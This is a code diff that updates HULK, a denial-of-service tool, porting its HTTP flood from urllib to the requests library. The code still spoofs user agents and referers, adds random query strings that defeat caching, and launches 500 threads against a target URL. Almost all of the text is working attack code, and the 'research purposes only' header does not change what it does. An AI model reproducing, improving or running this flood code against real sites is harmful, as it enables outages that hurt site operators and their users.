@@ -6,25 +6,21 @@
 # its is meant for research purposes only and
 # any malicious usage of this tool is prohibited.
 #
-# authors :  Barry Shteiman, Maxim Muzafarov , version 1.1
+# authors :  Barry Shteiman, Maxim Muzafarov , version 1.2
 # ----------------------------------------------------------------------------
 import sys
-
-if sys.version < '3':
-    from urllib2 import Request, urlopen, HTTPError, URLError
-else:
-    from urllib.request import Request, urlopen, HTTPError, URLError
+import requests
+from requests.exceptions import HTTPError, ConnectionError
 
 from random import randint, choice
 from re import search
 from string import ascii_lowercase as alphabet
 from threading import Thread
 
-
-#global params
+# global params
 url = ''
 host = ''
-headers_useragents = [
+useragents = [
     'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 YaBrowser/1.7.1364.22194 Safari/537.22',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/28.0.1500.71 Chrome/28.0.1500.71 Safari/537.36',
@@ -137,7 +133,7 @@ headers_useragents = [
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.66 Safari/537.36',
 ]
 
-headers_referers = [
+referers = [
     'http://www.google.com/?q=',
     'http://www.usatoday.com/search/results?q=',
     'http://engadget.search.aol.com/search?q=',
@@ -166,9 +162,9 @@ def set_safe():
     safe = True
 
 
-#builds random ascii string
+# builds random ascii string
 def buildblock():
-    return(''.join(choice(alphabet) for _ in range(randint(3, 10))))
+    return ''.join(choice(alphabet) for _ in range(randint(3, 10)))
 
 
 def usage():
@@ -179,38 +175,44 @@ def usage():
     sys.exit()
 
 
-#http request
+# http request
 def httpcall(url):
     code = 0
-    if url.count("?") > 0:
-        param_joiner = "&"
-    else:
-        param_joiner = "?"
-    request = Request(url + param_joiner + buildblock() + '=' + buildblock())
-    request.add_header('User-Agent', choice(headers_useragents))
-    request.add_header('Cache-Control', 'no-cache')
-    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-    request.add_header('Referer', choice(headers_referers) + buildblock())
-    request.add_header('Keep-Alive', randint(110, 120))
-    request.add_header('Connection', 'keep-alive')
-    request.add_header('Host', host)
     try:
-            urlopen(request)
+        requests.get(
+            url,
+            params={buildblock(): buildblock()},
+            headers={
+                'User-Agent': choice(useragents),
+                'Cache-Control': 'no-cache',
+                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                'Referer': choice(referers) + buildblock(),
+                'Keep-Alive': randint(110, 120)}
+        )
     except HTTPError as e:
-            #print(e.code)
-            set_flag(1)
-            print('Response Code 500')
-            code = 500
-    except URLError as e:
-            #print(e.reason)
-            sys.exit()
+        # print(e.code)
+        set_flag(1)
+        print('Response Code 500')
+        code = 500
+    except ConnectionError as e:
+        # print(e.reason)
+        sys.exit()
     else:
-            inc_counter()
-            urlopen(request)
-    return(code)
+        inc_counter()
+        requests.get(
+            url,
+            params={buildblock(): buildblock()},
+            headers={
+                'User-Agent': choice(useragents),
+                'Cache-Control': 'no-cache',
+                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+                'Referer': choice(referers) + buildblock(),
+                'Keep-Alive': randint(110, 120)}
+        )
+    return (code)
 
 
-#http caller thread
+# http caller thread
 class HTTPThread(Thread):
     def run(self):
         try:
@@ -225,17 +227,17 @@ class HTTPThread(Thread):
 # monitors http threads and counts requests
 class MonitorThread(Thread):
     def run(self):
-        previous = request_counter
+        prev = request_counter
         while flag == 0:
-            if ((previous + 100 < request_counter)
-                and (previous != request_counter)):
+            if (prev + 100 < request_counter) and (prev != request_counter):
                 print("{} Requests Sent".format(request_counter))
-                previous = request_counter
+                prev = request_counter
         if flag > 1:
             print("\n-- HULK Attack Finished --")
 
+
 if __name__ == "__main__":
-    #execute
+    # execute
     try:
         if len(sys.argv) < 2:
             usage()
@@ -249,10 +251,10 @@ if __name__ == "__main__":
                         set_safe()
                 url = sys.argv[1]
                 if url.count("/") == 2:
-                    url = url + "/"
+                    url += "/"
                 m = search('https?\://([^/]*)/?.*', url)
                 host = m.group(1)
-                headers_referers.append('http://' + host + '/')
+                referers.append('http://' + host + '/')
                 for i in range(500):
                     t = HTTPThread()
                     t.start()
